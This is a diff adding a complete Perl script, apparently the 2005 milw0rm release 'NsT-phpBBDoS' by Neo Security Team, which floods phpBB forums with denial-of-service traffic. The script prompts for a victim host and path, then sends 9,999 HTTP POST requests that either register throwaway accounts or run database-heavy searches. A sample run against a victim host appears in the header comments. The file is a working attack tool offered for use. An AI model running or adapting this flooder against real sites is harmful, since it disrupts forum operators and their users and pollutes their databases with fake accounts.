@@ -1,0 +1,145 @@
+##  Name: NsT-phpBBDoS (Perl Version)
+##  Copyright: Neo Security Team
+##  Author: HaCkZaTaN
+##  Ported: g30rg3_x
+##  Date: 20/06/05
+##  Description: NsT-phpBB DoS By HackZatan Ported tu perl By g30rg3_x
+##               A Simple phpBB Registration And Search DoS Flooder.
+## 
+##  g30rg3x@neosecurity:/home/g30rg3x# perl NsT-phpBBDoS.pl
+##  [+] 
+##  [+] NsT-phpBBDoS v0.2 by HaCkZaTaN
+##  [+] ported to Perl By g30rg3_x
+##  [+] Neo Security Team
+##  [+]
+##  [+] Host |without http://www.| victimshost.com
+##  [+] Path |example. /phpBB2/ or /| /phpBB2/
+##  [+] Flood Type |1=Registration 2=Search| 1
+##  [+] ..........................................................
+##  [+] ..........................................................
+##  [+] ..........................................................
+##  [+] ..............................................
+##  [+] The Socket Can't Connect To The Desired Host or the Host is MayBe DoSed
+##  g30rg3x@neosecurity:/home/g30rg3x# echo "Let see how many users I have created"
+
+use IO::Socket;
+
+## Initialized X
+$x = 0;
+
+## Flood Variables Provided By User
+print q(
+NsT-phpBBDoS v0.2 by HaCkZaTaN
+ported to Perl By g30rg3_x
+Neo Security Team
+
+);
+print q(Host |without http://www.| );
+$host = <STDIN>;
+chop ($host);
+
+print q(Path |example. /phpBB2/ or /| );
+$pth = <STDIN>;
+chop ($pth);
+
+print q(Flood Type |1 = Registration, 2 = Search| );
+$type = <STDIN>;
+chop ($type);
+
+## If Type Is Equals To 1 or Registration
+if($type == 1){
+
+## User Loop for 9999 loops (enough for Flood xDDDD)
+while($x != 9999)
+{
+
+## Building User in base X
+$uname = "username=NsT__" . "$x";
+
+## Building User Mail in base X
+$umail = "&email=NsT__" . "$x";
+
+## Final String to Send
+$postit = "$uname"."$umail"."%40neosecurityteam.net&new_password=0123456&password_confirm=0123456&icq=&aim=N%2FA&msn=&yim=&website=&location=&occupation=&interests=&signature=&viewemail=0&hideonline=0&notifyreply=0&notifypm=1&popup_pm=1&attachsig=1&allowbbcode=1&allowhtml=0&allowsmilies=1&language=english&style=2&timezone=0&dateformat=D+M+d%2C+Y+g%3Ai+a&mode=register&agreed=true&coppa=0&submit=Submit";
+
+## Posit Length
+$lrg = length $postit;
+
+## Connect Socket with Variables Provided By User
+my $sock = new IO::Socket::INET (
+                                 PeerAddr => "$host",
+                                 PeerPort => "80",
+                                 Proto => "tcp",
+                                );
+die "\nThe Socket Can't Connect To The Desired Host or the Host is MayBe DoSed: $!\n" unless $sock;
+
+## Sending Truth Socket The HTTP Commands For Register a User in phpBB Forums
+print $sock "POST $pth"."profile.php HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\n";
+print $sock "Referer: $host\n";
+print $sock "Accept-Language: en-us\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "Accept-Encoding: gzip, deflate\n";
+print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
+print $sock "Connection: Keep-Alive\n";
+print $sock "Cache-Control: no-cache\n";
+print $sock "Content-Length: $lrg\n\n";
+print $sock "$postit\n";
+close($sock);
+
+## Print a "." for every loop
+syswrite STDOUT, ".";
+
+## Increment X in One for every Loop 
+$x++;
+}
+
+## If Type Is Equals To 2 or Search
+}
+elsif ($type == 2){
+
+## User Search Loop for 9999 loops (enough for Flood xDDDD)
+while($x != 9999)
+{
+## Final Search String to Send
+$postit = "search_keywords=Neo+Security+Team+Proof+of+Concept+$x+&search_terms=any&search_author=&search_forum=-1&search_time=0&search_fields=msgonly&search_cat=-1&sort_by=0&sort_dir=ASC&show_results=posts&return_chars=200";
+
+## Posit Length
+$lrg = length $postit;
+
+## Connect Socket with Variables Provided By User
+my $sock = new IO::Socket::INET (
+                                 PeerAddr => "$host",
+                                 PeerPort => "80",
+                                 Proto => "tcp",
+                                );
+die "\nThe Socket Can't Connect To The Desired Host or the Host is MayBe DoSed: $!\n" unless $sock;
+
+## Sending Truth Socket The HTTP Commands For Send A BD Search Into phpBB Forums
+print $sock "POST $pth"."search.php?mode=results HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n";
+print $sock "Referer: $host\n";
+print $sock "Accept-Language: en-us\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "Accept-Encoding: gzip, deflate\n";
+print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
+print $sock "Connection: Keep-Alive\n";
+print $sock "Cache-Control: no-cache\n";
+print $sock "Content-Length: $lrg\n\n";
+print $sock "$postit\n";
+close($sock);
+
+## Print a "." for every loop
+syswrite STDOUT, ".";
+
+## Increment X in One for every Loop
+$x++;
+}
+}else{
+## STF??? What Do You Type
+	die "Option not Allowed O_o???\n";
+}
+
+# milw0rm.com [2005-06-22] 
